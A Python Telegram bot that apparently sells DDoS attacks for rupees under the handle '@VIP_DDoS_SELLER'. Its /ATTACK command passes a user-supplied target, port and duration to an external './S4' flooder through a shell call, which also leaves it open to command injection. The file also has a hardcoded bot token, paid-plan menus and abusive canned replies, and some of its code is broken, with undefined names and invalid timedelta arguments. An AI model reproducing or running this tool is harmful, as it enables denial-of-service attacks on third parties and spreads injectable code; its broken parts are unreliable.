import telebot
#_________________________________________________________________________________________________________________________________________________
import subprocess
#_________________________________________________________________________________________________________________________________________________
import datetime
#_________________________________________________________________________________________________________________________________________________
import os
#_________________________________________________________________________________________________________________________________________________
bot = telebot.TeleBot('7278781816:AAEuRI5I-zMcrdJ9-Tq09cLsqAiUzcmNrKo')
#_________________________________________________________________________________________________________________________________________________
admin_id = ["6480787990"]
#_________________________________________________________________________________________________________________________________________________
USER_FILE = "users.txt"                             
LOG_FILE = "log.txt"
#_________________________________________________________________________________________________________________________________________________
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
#_________________________________________________________________________________________________________________________________________________
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass
#_________________________________________________________________________________________________________________________________________________
allowed_user_ids = read_users()
#_________________________________________________________________________________________________________________________________________________
def log_command(user_id, target, port, time):
    admin_id = ["6769245930"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
#_________________________________________________________________________________________________________________________________________________
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"               
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")
#_________________________________________________________________________________________________________________________________________________
import datetime

user_approval_expiry = {}

def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.D < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"
#_________________________________________________________________________________________________________________________________________________
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(H=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(D=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(W=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(D=30 * duration)  
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['JOIN'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()   
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]
#_________________________________________________________________________________________________________________________________________________
            try:
                duration = int(duration_str[:-4])  
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "ùôÖùôäùôÑùôâùôÄùòø ‚úÖ"
                bot.reply_to(message, response)
                return
#_________________________________________________________________________________________________________________________________________________
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"ùôÖùôäùôÑùôâùôÄùòø ‚úÖ"
                else:
                    response = "üö´ ùôèùôçùôî ùòºùôÇùòºùôÑùôâ üö´"
            else:
                response = "ùòºùôáùôçùôÄùòºùòøùôî ùôÖùôäùôÑùôâùôÄùòø üî•"
        else:
            response = "üö´ ùôèùôçùôî ùòºùôÇùòºùôÑùôâ üö´"
    else:
        response = "ùôèùôÉùôÑùôé ùòæùôäùôàùôàùòºùôâùòø ùôâùôäùôè ùôîùôäùôê --> @VIP_DDoS_SELLER"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['REMOVE'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"ùó•ùóòùó†ùó¢ùó©ùóòùóó ‚ùå"
            else:
                response = f"ùôêùôéùôÄùôç ùôâùôäùôè ùôÅùôäùôêùôâùòø‚ÄºÔ∏è"
        else:
            response = '''üö´ ùôèùôçùôî ùòºùôÇùòºùôÑùôâ üö´'''
    else:
        response = "ùôèùôÉùôÑùôé ùòæùôäùôàùôàùòºùôâùòø ùôâùôäùôè ùôîùôäùôê --> @VIP_DDoS_SELLER"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
#_________________________________________________________________________________________________________________________________________________
    response = f"ü¶á‚òÖ‚Éùùë®ùëªùëªùë®ùë™ùë≤‚òÖ‚Éù ü¶á"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
#_________________________________________________________________________________________________________________________________________________
bgmi_cooldown = {}
#_________________________________________________________________________________________________________________________________________________
COOLDOWN_TIME =15
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['ATTACK'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                if time_since_last_attack < 300:
                    remaining_time = 300 - time_since_last_attack
                    response = f"ùôíùòºùôÑùôè ùôÅùôäùôç ùôâùôÄùôí ùòºùôèùôèùòºùòæùôÜ \nùôÇùôÄùôâùôÄùôçùòºùôèùôÄùòø ùòæùôäùôäùôá ùòøùôäùôíùôâ ùôéùôÄùòæùôäùôâùòø --> {remaining_time} \nùòΩùôÄùôÅùôäùôçùôÄ ùôéùôÄùôâùòø ùôâùôÄùôí ùòºùôèùôèùòºùòæùôÜ"
                    bot.reply_to(message, response)
                return
#_________________________________________________________________________________________________________________________________________________
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  
            target = command[1]
            port = int(command[2])  
            time = int(command[3]) 
            if time > 240:
                response = "ùê•ùêûùê¨ùê¨ ùê≠ùê°ùêöùêß ùüêùüíùüé"
            else:
                record_command_logs(user_id, '/ATTACK', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time) 
                full_command = f"./S4 {target} {port} {time} 40"
                process = subprocess.run(full_command, shell=True)
                response = f"ü¶á‚òÖ‚Éù ‚Ç£∆ó≈á∆ó≈ûƒ¶‚Ç¨ƒê‚òÖ‚Éù ü¶á"
                bot.reply_to(message, response)  
        else:
            response = "ùôçùôÄùòºùòøùôî ùôèùôä ùôêùôéùôÄ" 
    else:
        response = ("üö© @VIP_DDoS_SELLE üö©")
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''‚ô°‚ñ™Ô∏é‚Ä¢ùó¶ùüú‚Ä¢‚ñ™Ô∏é‚ô°ùñîùñãùñãùñéùñàùñéùñÜùñë\n‡ºíÕ¢\n‚ô•‚ÉùüÖæ“ìÕ•“ì…™·¥ÑÕ£…™Õ´·¥Ä ü‡ºíƒéùïØùñîùöÇ·≠ÑüÖ∫Œπ–∏g‚úç\n\n‚òÖ ùôÇùôÄùôè ùôãùôáùòºùôâ --> /PLAN \n‚òÖ ùôâùôÄùôÄùòø ùôÉùôÄùôáùôã --> /OWNER \n‚òÖ ùòºùôèùôèùòºùòæùôÜ --> /ùòºùôèùôèùòºùòæùôÜ \n‚òÖ ùôàùòºùôÑùôâ ùôÇùôçùôäùôêùôã --> /MAIN\n‚òÖ ùòΩùôÇùôàùôÑ ùôÉùòºùòæùôÜùôé --> /HACK\n\nùôáùôÄùòºùôëùôÄ ùòºùôâùòø ùôîùôäùôêùôç ùôáùôäùôéùôé'''
    bot.reply_to(message, response)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "PLAN":
        bot.reply_to(message, "*ùêíùüí ùêïùêàùêè ùêåùêÑùêåùêÅùêÑùêëùêíùêáùêàùêè‚ò†Ô∏è \n\nùêçùêéùêì - ùüêùüí/ùüï ùêéùêñùêçùêÑùêë ùêíùêîùêèùêèùêéùêëùêì üîª \n‚ú™ ùüè ùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò --> ùüêùüé‚Çπ \n‚ú™ ùüêùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò ùüëùüé‚Çπ \n‚ú™ ùüèùêÉùêÄùêò ùêÜùêÑùêì ùêéùêçùêãùêò ùüèùüèùüé‚Çπ \n‚ú™ ùüëùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüêùüìùüé‚Çπ \n‚ú™ ùüïùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüìùüìùüé‚Çπ\n\nùôÑùôÅ ùôàùôÑùôéùôé ùòºùôâùôî ùòºùôèùôèùòºùòæùôÜ ùòøùôÑùôçùôÄùòæùôè ùòæùôäùôâùôèùòºùòæùôè ùôäùôíùôâùôÄùôç üö©*", parse_mode='Markdown')
    elif message.text == "ATTACK":
        attack_command(message)
    elif message.text == "OWNER":
        bot.send_message(message.chat.id, "*ùêòùê®ùêÆ ùêÜùêûùê≠ ùêéùê∞ùêßùêûùê´ ùêîùê¨ùêûùê´ùêßùêöùê¶ùêû --> @VIP_DDoS_SELLER \nùêÅùêÆùê≠ ùêíùêûùê≤ ùêéùêßùê•ùê≤ ùêÑùêùùêÆùêúùêöùê≠ùê¢ùê®ùêß ùêèùêÆùê´ùê©ùê®ùê¨ùêû ùêéùê≠ùê°ùêûùê´ùê∞ùê¢ùê¨ùêû ùêòùê®ùêÆ ùêÜùêûùê≠ ùêéùêßùê•ùê≤ ùêÅùê•ùê®ùêúùê§ ùêãùê¢ùê¨ùê≠*", parse_mode='Markdown')
    elif message.text == "Buy":
        bot.send_message(message.chat.id, "*ùêíùüí ùêïùêàùêè ùêåùêÑùêåùêÅùêÑùêëùêíùêáùêàùêè‚ò†Ô∏è \n\nùêçùêéùêì - ùüêùüí/ùüï ùêéùêñùêçùêÑùêë ùêíùêîùêèùêèùêéùêëùêì üîª \n‚ú™ ùüè ùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò --> ùüêùüé‚Çπ \n‚ú™ ùüêùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò ùüëùüé‚Çπ \n‚ú™ ùüèùêÉùêÄùêò ùêÜùêÑùêì ùêéùêçùêãùêò ùüèùüèùüé‚Çπ \n‚ú™ ùüëùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüêùüìùüé‚Çπ \n‚ú™ ùüïùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüìùüìùüé‚Çπ\n\nùôÑùôÅ ùôàùôÑùôéùôé ùòºùôâùôî ùòºùôèùôèùòºùòæùôÜ ùòøùôÑùôçùôÄùòæùôè ùòæùôäùôâùôèùòºùòæùôè ùôäùôíùôâùôÄùôç üö©*", parse_mode='Markdown')
    elif message.text == "Not":
        bot.send_message(message.chat.id, "*ùôèùôä ùôàùôè ùôÜùôç ùòºùôèùôèùòºùòæùôÜ ùòºùôÇùôÄùôç ùôíùôäùôçùôÜ ùôâùôÉùôÑ ùôÜùôç ùôçùôÉùòº ùôèùôä ùòΩùòæü§¨*", parse_mode='Markdown')   
    elif message.text == "DM":
        bot.send_message(message.chat.id, "*@VIP_DDoS_SELLE*", parse_mode='Markdown')    
    elif message.text == "Thanks":
        bot.send_message(message.chat.id, "*ùôíùôÄùôáùòæùôäùôàùôÄ ùôàùôÄùôçùôÑ ùôÖùòºùòºùôâ ‚ù§Ô∏è*", parse_mode='Markdown')   
    elif message.text == "/HACK":
        bot.send_message(message.chat.id, "*https://t.me/lalu_op_cnl*", parse_mode='Markdown')    
    elif message.text == "/MAIN":
        bot.send_message(message.chat.id, "*https://t.me/S4xOFFICIALxGRP*", parse_mode='Markdown')    
    elif message.text == "NOT":
        bot.send_message(message.chat.id, "*ùôèùôä ùôàùôè ùôÜùôç ùòºùôèùôèùòºùòæùôÜ ùòºùôÇùôÄùôç ùôíùôäùôçùôÜ ùôâùôÉùôÑ ùôÜùôç ùôçùôÉùòº ùôèùôä ùòΩùòæü§¨*", parse_mode='Markdown')    
    elif message.text == "on":
        bot.send_message(message.chat.id, "*ùòºùòΩùôÉùôÑ ùôèùô§ ùôêùôéùôÄ ùôÜùôç ùôáùôÄ ùôàùôÄùôçùôÄ ùòΩùôÉùòºùôÑ*", parse_mode='Markdown')    
    elif message.text == "Not working":
        bot.send_message(message.chat.id, "*ùôèùôä ùôàùôè ùôÜùôç ùòºùôèùôèùòºùòæùôÜ ùòºùôÇùôÄùôç ùôíùôäùôçùôÜ ùôâùôÉùôÑ ùôÜùôç ùôçùôÉùòº ùôèùôä ùòΩùòæü§¨*", parse_mode='Markdown')       
    elif message.text == "Not Working":
        bot.send_message(message.chat.id, "*ùôèùôä ùôàùôè ùôÜùôç ùòºùôèùôèùòºùòæùôÜ ùòºùôÇùôÄùôç ùôíùôäùôçùôÜ ùôâùôÉùôÑ ùôÜùôç ùôçùôÉùòº ùôèùôä ùòΩùòæü§¨*", parse_mode='Markdown')      
    elif message.text == "Chutiya":
        bot.send_message(message.chat.id, "*ùôèùôÄùôçùôÑ ùôàùòºùòº ùôÜùôÑ ùòæùôÉùôêùôè ùôáùòºùôíùòøùôÄ ùôäùôç ùôèùôÄùôçùôÑ ùòΩùòºùôÉùòºùôâ ùôÜùôä ùôÇùôÉùôäùòøùôÑ ùòΩùôâùòºùôÜùôÄ ùôÜùôÄ ùòæùôÉùôäùòø ùòøùòºùôáùôêùôâùôÇùòº*", parse_mode='Markdown')       
    elif message.text == "Acha h":
        bot.send_message(message.chat.id, "*ùôèùôÉùòºùôâùôÜùôé üôè*", parse_mode='Markdown')        
    elif message.text == "S4":
        bot.send_message(message.chat.id, "*ùòΩùôêùôéùôî ùôçùôÑùôÇùôÉùôè ùôâùôäùôí ùòæùôäùôàùôÄ ùôÑùôâ ùòøùôà ùòºùôâùòø ùôíùòºùôÑùôè ùôÅùôäùôç ùôçùôÄùôãùôáùôî*", parse_mode='Markdown')         
    elif message.text == "Luchi":
        bot.send_message(message.chat.id, "*ùòΩùôêùôéùôî ùôçùôÑùôÇùôÉùôè ùôâùôäùôí ùòæùôäùôàùôÄ ùôÑùôâ ùòøùôà ùòºùôâùòø ùôíùòºùôÑùôè ùôÅùôäùôç ùôçùôÄùôãùôáùôî*", parse_mode='Markdown')          
    elif message.text == "Free":
        bot.send_message(message.chat.id, "*ùôàùôêùôÖùôÄ ùòΩùôÉùôÑ ùòøùôÄ ùòøùôÄ ùôîùôßùôß ùôÅùôçùôÄùôÄ ùôÉ ùôèùôä*", parse_mode='Markdown')           
    elif message.text == "free":
        bot.send_message(message.chat.id, "*ùôàùôêùôÖùôÄ ùòΩùôÉùôÑ ùòøùôÄ ùòøùôÄ ùôîùôßùôß ùôÅùôçùôÄùôÄ ùôÉ ùôèùôä*", parse_mode='Markdown')          
    elif message.text == "HACK":
        bot.send_message(message.chat.id, "*https://t.me/lalu_op_cnl*", parse_mode='Markdown')    
    elif message.text == "MAIN":
        bot.send_message(message.chat.id, "*https://t.me/S4xOFFICIALxGRP*", parse_mode='Markdown')      
    elif message.text == "Join":
        bot.send_message(message.chat.id, "*https://t.me/lalu_op_cnl*", parse_mode='Markdown')    
    elif message.text == "join":
        bot.send_message(message.chat.id, "*https://t.me/S4xOFFICIALxGRP*", parse_mode='Markdown')    
    elif message.text == "/OWNER":
        bot.send_message(message.chat.id, "*ùêòùê®ùêÆ ùêÜùêûùê≠ ùêéùê∞ùêßùêûùê´ ùêîùê¨ùêûùê´ùêßùêöùê¶ùêû --> @VIP_DDoS_SELLER \nùêÅùêÆùê≠ ùêíùêûùê≤ ùêéùêßùê•ùê≤ ùêÑùêùùêÆùêúùêöùê≠ùê¢ùê®ùêß ùêèùêÆùê´ùê©ùê®ùê¨ùêû ùêéùê≠ùê°ùêûùê´ùê∞ùê¢ùê¨ùêû ùêòùê®ùêÆ ùêÜùêûùê≠ ùêéùêßùê•ùê≤ ùêÅùê•ùê®ùêúùê§ ùêãùê¢ùê¨ùê≠*", parse_mode='Markdown')    
    elif message.text == "/PLAN":
        bot.send_message(message.chat.id, "*ùêíùüí ùêïùêàùêè ùêåùêÑùêåùêÅùêÑùêëùêíùêáùêàùêè‚ò†Ô∏è \n\nùêçùêéùêì - ùüêùüí/ùüï ùêéùêñùêçùêÑùêë ùêíùêîùêèùêèùêéùêëùêì üîª \n‚ú™ ùüè ùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò --> ùüêùüé‚Çπ \n‚ú™ ùüêùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò ùüëùüé‚Çπ \n‚ú™ ùüèùêÉùêÄùêò ùêÜùêÑùêì ùêéùêçùêãùêò ùüèùüèùüé‚Çπ \n‚ú™ ùüëùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüêùüìùüé‚Çπ \n‚ú™ ùüïùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüìùüìùüé‚Çπ\n\nùôÑùôÅ ùôàùôÑùôéùôé ùòºùôâùôî ùòºùôèùôèùòºùòæùôÜ ùòøùôÑùôçùôÄùòæùôè ùòæùôäùôâùôèùòºùòæùôè ùôäùôíùôâùôÄùôç üö©*", parse_mode='Markdown')    
    elif message.text == "plan":
        bot.send_message(message.chat.id, "*ùêíùüí ùêïùêàùêè ùêåùêÑùêåùêÅùêÑùêëùêíùêáùêàùêè‚ò†Ô∏è \n\nùêçùêéùêì - ùüêùüí/ùüï ùêéùêñùêçùêÑùêë ùêíùêîùêèùêèùêéùêëùêì üîª \n‚ú™ ùüè ùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò --> ùüêùüé‚Çπ \n‚ú™ ùüêùêáùêéùêîùêë ùêÜùêÑùêì ùêéùêçùêãùêò ùüëùüé‚Çπ \n‚ú™ ùüèùêÉùêÄùêò ùêÜùêÑùêì ùêéùêçùêãùêò ùüèùüèùüé‚Çπ \n‚ú™ ùüëùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüêùüìùüé‚Çπ \n‚ú™ ùüïùêÉùêÄùêòùêí ùêÜùêÑùêì ùêéùêçùêãùêò ùüìùüìùüé‚Çπ\n\nùôÑùôÅ ùôàùôÑùôéùôé ùòºùôâùôî ùòºùôèùôèùòºùòæùôÜ ùòøùôÑùôçùôÄùòæùôè ùòæùôäùôâùôèùòºùòæùôè ùôäùôíùôâùôÄùôç üö©*", parse_mode='Markdown')    
    else:
        bot.reply_to(message, "*ùòΩùòºùôÜùòæùôÉùôäùòøùôÑ ùôàùôè ùôÜùôç ùôáùòºùôíùòøùôÄ*", parse_mode='Markdown')
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['NOTIFY'])
#_________________________________________________________________________________________________________________________________________________
def NOTIFY_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_NOTIFY = "‚úâÔ∏è ùêçùêéùêìùêàùêÖùêàùêÇùêÄùêìùêàùêéùêç ‚úâÔ∏è" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_NOTIFY)
                    except Exception as e:
                        print(f"‚ùå ùôÅùòºùôÑùôáùôÄùòø ‚ùå")
            response = "‚úÖ ùôéùôÄùôâùòøùôÑùôâùôÇ ùôâùôäùôèùôÑùôÅùôÑùòæùòºùôèùôÑùôäùôâ ‚úÖ"
        else:
            response = "ùôèùôîùôãùôÄ ùòº ùôâùôäùôèùôÑùôÅùôÑùòæùòºùôèùôÑùôäùôâ ùôàùòºùôéùôéùòºùôÇùôÄ"
    else:
        response = "ùêéùêçùêãùêò ùêÖùêéùêë ùêéùêñùêçùêÑùêë"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
#_________________________________________________________________________________________________________________________________________________
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
#_________________________________________________________________________________________________________________________________________________
